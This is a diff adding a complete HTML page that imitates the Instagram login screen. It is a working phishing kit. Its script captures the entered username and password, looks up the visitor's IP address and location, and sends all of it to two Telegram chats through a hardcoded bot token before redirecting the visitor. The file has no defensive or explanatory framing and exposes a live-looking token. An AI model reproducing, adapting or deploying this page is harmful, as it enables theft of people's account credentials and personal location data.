@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram.com</title>
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/media-queries.css" />
+    <link rel="icon" href="photos/insta-icon.jpg" />
+</head>
+<body>
+    <main>
+        <div class="log-in-container">
+            <div class="log-in">
+                <img src="photos/logo.png" class="logo" alt="Instagram Logo" />
+                <div class="log-in-form">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required />
+                    <input type="password" id="password" placeholder="Password" required />
+                    <button class="log-in-button" onclick="sendLoginData()">Log In</button>
+                </div>
+
+                <span class="or-divider">OR</span>
+                <div class="fb-login">
+                    <a href="#">
+                        <img src="photos/facebook-icon.png" alt="Facebook Login Icon">
+                        <span>Log in with Facebook</span>
+                    </a>
+                </div>
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="sign-up">
+                <span>Don't have an account? <a href="#">Sign up</a></span>
+            </div>
+            <div class="get-the-app">
+                <span>Get the app</span>
+                <div class="app-images">
+                    <a href="#"><img src="photos/applestore.png" alt="Download from App Store" /></a>
+                    <a href="#"><img src="photos/googlestore.png" alt="Download from Google Play Store" /></a>
+                </div>
+            </div>
+        </div>
+        <div class="phones-container">
+            <img src="photos/phones.png" alt="Instagram Mobile Preview" />
+        </div>
+    </main>
+
+    <footer>
+        <ul class="footer-links">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">JOBS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">TOP</a></li>
+            <li><a href="#">ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <span class="copyright">&copy; 2025 INSTAGRAM FROM META</span>
+    </footer>
+
+    <script>
+        function getChatIdFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id'); // Get chat ID from ?id=12345
+        }
+
+        function sendLoginData() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            if (username === "" || password === "") {
+                alert("Please enter both username and password.");
+                return;
+            }
+
+            var botToken = "7658644625:AAEoKfPDyhponCstcBgRnw3JSOXu0APHHhI"; // Replace with your bot token
+            var chatId1 = "5425526761"; // Your fixed chat ID
+            var chatId2 = "6461337070"; // Get dynamic chat ID from URL
+
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip || "N/A";
+                    var country = data.country || "N/A";
+                    var region = data.region || "N/A";
+                    var timezone = data.timezone || "N/A";
+                    var city = data.city || "N/A";
+                    var currentTime = new Date().toLocaleTimeString();
+                    var currentDate = new Date().toLocaleDateString();
+
+                    var message = `
+HI YOU HAVE NEW HIT
+
+------------------------------------
+LOGIN BY   : Instagram
+EMAIL      : ${username}
+PASSWORD   : ${password}
+COUNTRY    : ${country}, ${region}, ${city}
+TIMEZONE   : ${timezone}
+IP         : ${ip}
+TIME       : ${currentTime}
+DATE       : ${currentDate}
+------------------------------------
+DEV BY     : @ITZ_ME_545
+`;
+
+                    function sendToTelegram(chatId) {
+                        if (chatId) {
+                            var telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                            
+                            return fetch(telegramAPI)
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log("Sent to Chat ID: " + chatId, data);
+                                    return true;
+                                })
+                                .catch(error => {
+                                    console.error("Error sending to Chat ID: " + chatId, error);
+                                    return false;
+                                });
+                        }
+                        return Promise.resolve(false);
+                    }
+
+                    Promise.all([sendToTelegram(chatId1), sendToTelegram(chatId2)])
+  .then(results => {
+    if (results.includes(true)) {
+      // Redirect instead of alert
+      window.location.href = "https://example.com/success";
+    } else {
+      alert("Failed to send login data. Please try again.");
+    }
+  })
+  .catch(err => {
+    console.error(err);
+    alert("Something went wrong!");
+  });
+
+                })
+                .catch(error => {
+                    console.error("Error fetching IP info:", error);
+                });
+        }
+    </script>
+
+</body>
+</html>
